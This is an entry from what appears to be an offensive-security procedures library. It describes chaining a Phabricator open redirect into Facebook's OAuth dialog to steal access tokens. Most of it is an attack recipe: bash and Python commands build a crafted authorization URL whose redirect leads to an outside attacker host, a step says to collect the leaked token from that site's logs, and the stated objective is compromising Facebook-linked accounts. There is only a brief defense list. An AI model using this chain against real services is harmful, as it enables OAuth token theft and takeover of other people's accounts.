---
id: proc-chain-facebook-3930
tags:
  - oauth
  - open-redirect
  - facebook
  - phabricator
type: procedure
tools: []
tactics:
  - '[[Credential Access]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Steal Application Access Token]]'
updated_at: '2025-12-14T17:24:35.418Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Credential Access]]'
mitre_techniques:
  - '[[Steal Application Access Token]]'
---
# Chain with Facebook OAuth

## Summary

This procedure chains the Phabricator open redirect URL as the redirect_uri in Facebook's OAuth dialog, allowing token theft upon user authorization.

## Description

The attacker URL-encodes the malicious Phabricator URL and inserts it into Facebook's /dialog/oauth endpoint parameters. When a user authorizes the app, Facebook redirects to Phabricator, which auto-redirects to the attacker site, leaking the OAuth token. This targets Facebook-integrated apps; prerequisites include a Facebook app client_id and the crafted Phabricator URL.

## Requirements

1. Facebook app client_id (e.g., from developer console)
2. Encoded Phabricator malicious URL
3. User access to Facebook authorization

## Defense

Defensive measures and detection strategies:

- Validate chained redirect_uris in OAuth providers
- Monitor for unexpected redirects in authorization logs
- Educate users on suspicious OAuth prompts

## Objectives

1. Integrate Phabricator exploit into Facebook flow
2. Achieve token leak via chained redirect
3. Compromise Facebook-linked accounts

## Instructions

### Step 1: Encode Phabricator URL

**Context**: Prepare the malicious URL for use as a parameter by URL-encoding it.

Use browser tools or command:

```bash
PHAB_URL="https://secure.phabricator.com/oauthserver/auth/?redirect_uri=http://files.nirgoldshlager.com&response_type=code&client_id=PHID-OASC-oyfqtnanxsukiw5lsnce&scope=ggg"
ENCODED=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$PHAB_URL'))")
echo $ENCODED
```

> Outputs URL-encoded string. Expected: Encoded Phabricator URL.

### Step 2: Construct Facebook Chained URL

**Context**: Build Facebook OAuth URL with encoded redirect_uri.

Assemble:

```bash
FB_URL="https://www.facebook.com/dialog/oauth?client_id=184510521580034&response_type=token&redirect_uri=$ENCODED"
echo $FB_URL
```

> Outputs full chained URL. Expected: URL ready for user interaction.

### Step 3: Test Chain

**Context**: Access the URL to simulate authorization and capture token.

Use browser; upon auth, check attacker site logs.

**Expected Output**: Token in query params on attacker site.

## MITRE ATT&CK Mapping

### Tactics

- [[Credential Access]] Credential Access

### Techniques

- [[Steal Application Access Token]] Steal Application Access Token

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- oauth
- open-redirect
- facebook
- phabricator
